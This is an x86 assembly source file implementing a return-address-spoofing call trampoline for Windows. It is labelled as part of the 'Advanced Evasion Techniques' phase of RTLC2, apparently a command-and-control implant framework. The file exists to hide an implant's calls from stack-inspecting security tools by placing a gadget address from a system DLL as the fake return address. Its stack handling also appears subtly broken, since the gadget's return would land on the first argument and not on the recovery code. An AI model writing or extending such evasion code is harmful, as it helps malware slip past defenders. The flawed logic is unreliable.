/*
 * spoof_call_x86.S - x86 (32-bit) Return Address Spoofing Trampoline
 *
 * 32-bit equivalent of spoof_call.S. Uses cdecl calling convention.
 * All arguments are passed on the stack.
 *
 * C prototype:
 *   extern "C" void* SpoofedCall32(void* func, void* gadget,
 *                                   int nargs, ...);
 *
 * Stack layout on entry (cdecl, caller pushes right-to-left):
 *   [esp+0x00] = return address
 *   [esp+0x04] = func (target function pointer)
 *   [esp+0x08] = gadget (fake return address, e.g. `ret` in kernel32)
 *   [esp+0x0C] = nargs (number of DWORD arguments for target func)
 *   [esp+0x10] = arg1 for target function
 *   [esp+0x14] = arg2 for target function
 *   ...
 *
 * The function sets up a new stack frame where the target function's
 * return address points to the gadget, and the gadget's return address
 * points back to our recovery code.
 *
 * Part of RTLC2 Phase 4: Advanced Evasion Techniques
 */

#ifdef RTLC2_WINDOWS
#ifndef _WIN64

.text
.intel_syntax noprefix

.global _SpoofedCall32
#ifdef __ELF__
.type _SpoofedCall32, @function
#endif

_SpoofedCall32:
    /*
     * Prologue: save callee-saved registers.
     */
    push    ebp
    mov     ebp, esp
    push    ebx
    push    esi
    push    edi

    /* Load parameters from the stack frame */
    mov     eax, [ebp + 0x08]      /* eax = func (target function) */
    mov     ecx, [ebp + 0x0C]      /* ecx = gadget (fake return address) */
    mov     edx, [ebp + 0x10]      /* edx = nargs (number of args) */

    /* Save our real return address */
    mov     esi, [ebp + 0x04]      /* esi = real return address */

    /* Save target func and gadget in callee-saved registers */
    mov     ebx, eax               /* ebx = target function */
    mov     edi, ecx               /* edi = gadget */

    /*
     * Build the target function's stack frame.
     *
     * For cdecl:
     *   [esp]        = return address (we put the gadget here)
     *   [esp+0x04]   = arg1
     *   [esp+0x08]   = arg2
     *   ...
     *
     * Below the gadget's return, we place our recovery address so
     * gadget's `ret` comes back to us.
     */

    /* Calculate total space needed: (nargs * 4) + 4 (gadget) + 4 (recovery) */
    lea     ecx, [edx * 4 + 8]
    sub     esp, ecx               /* Allocate space */

    /* Place recovery address at bottom */
    lea     eax, [.Lrecovery32]
    mov     [esp], eax             /* gadget will return here */

    /* Place gadget as target's return address */
    mov     [esp + 0x04], edi

    /* Copy arguments for the target function */
    /* Source: [ebp + 0x14] = first arg, [ebp + 0x18] = second, etc. */
    /* Dest: [esp + 0x08] = first arg slot */
    test    edx, edx
    jz      .Lno_args32

    xor     ecx, ecx              /* index counter */
.Lcopy_args32:
    mov     eax, [ebp + 0x14 + ecx * 4]
    mov     [esp + 0x08 + ecx * 4], eax
    inc     ecx
    cmp     ecx, edx
    jb      .Lcopy_args32

.Lno_args32:
    /*
     * Stack is now:
     *   [esp+0x00] = recovery address
     *   [esp+0x04] = gadget (target's return address)
     *   [esp+0x08] = arg1
     *   [esp+0x0C] = arg2
     *   ...
     *
     * We need target to see [esp] = gadget as return, and args after that.
     * So adjust esp up by 4 to skip the recovery addr for now.
     */
    add     esp, 0x04              /* Now [esp] = gadget, [esp+4] = arg1 */

    /* Jump to target function (not call, to avoid pushing return addr) */
    jmp     ebx

.Lrecovery32:
    /* We're back. eax has the return value. */
    /* edx:eax for 64-bit returns. */

    /* Restore stack. We need to undo all our allocations.
     * The simplest way is to restore ebp-based frame. */
    mov     esp, ebp
    sub     esp, 0x0C             /* back to where we pushed ebx/esi/edi */

    pop     edi
    pop     esi
    pop     ebx
    pop     ebp
    ret

#ifdef __ELF__
.size _SpoofedCall32, . - _SpoofedCall32
#endif

#endif /* !_WIN64 */
#endif /* RTLC2_WINDOWS */
